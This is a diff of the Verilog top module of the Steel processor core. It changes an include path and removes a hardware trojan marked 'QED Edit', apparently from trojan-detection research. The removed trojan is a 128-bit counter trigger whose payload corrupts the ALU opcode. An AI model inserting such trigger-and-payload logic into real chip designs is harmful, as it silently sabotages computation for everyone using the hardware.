@@ -48,7 +48,7 @@ SOFTWARE.
 ********************************************************************************/
 
 `timescale 1ns / 1ps
-`include "globals.vh"
+`include "./steelcore/rtl/globals.vh"
 
 module steel_top #(
 
@@ -454,20 +454,6 @@ module steel_top #(
     // PIPELINE STAGE 3
     // ---------------------------------
     
-    // Start QED Edit - Trojan Trigger: 128b Simple Counter
-    reg [127:0] tcount;
-    always @(posedge CLK) begin
-        if (RESET) begin
-            tcount <= 0;
-        end else begin
-            tcount <= tcount + 1;
-        end
-    end
-
-    wire [127:0] trigger_value = 128'hFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF;
-    wire trig = (tcount == trigger_value);
-    // End QED Edit - Trojan Trigger: 128b Simple Counter
-
     load_unit lu(
     
         .LOAD_SIZE(LOAD_SIZE_reg),
@@ -485,9 +471,7 @@ module steel_top #(
     
         .OP_1(RS1_reg),
         .OP_2(alu_2nd_src_mux),
-        // Start QED Edit - Trojan Payload: Corrupt ALU Opcode
-        .OPCODE((trig) ? 0 : ALU_OPCODE_reg),
-        // End QED Edit - Trojan Payload: Corrupt ALU Opcode
+        .OPCODE(ALU_OPCODE_reg),
         .RESULT(ALU_RESULT)
 
     );    
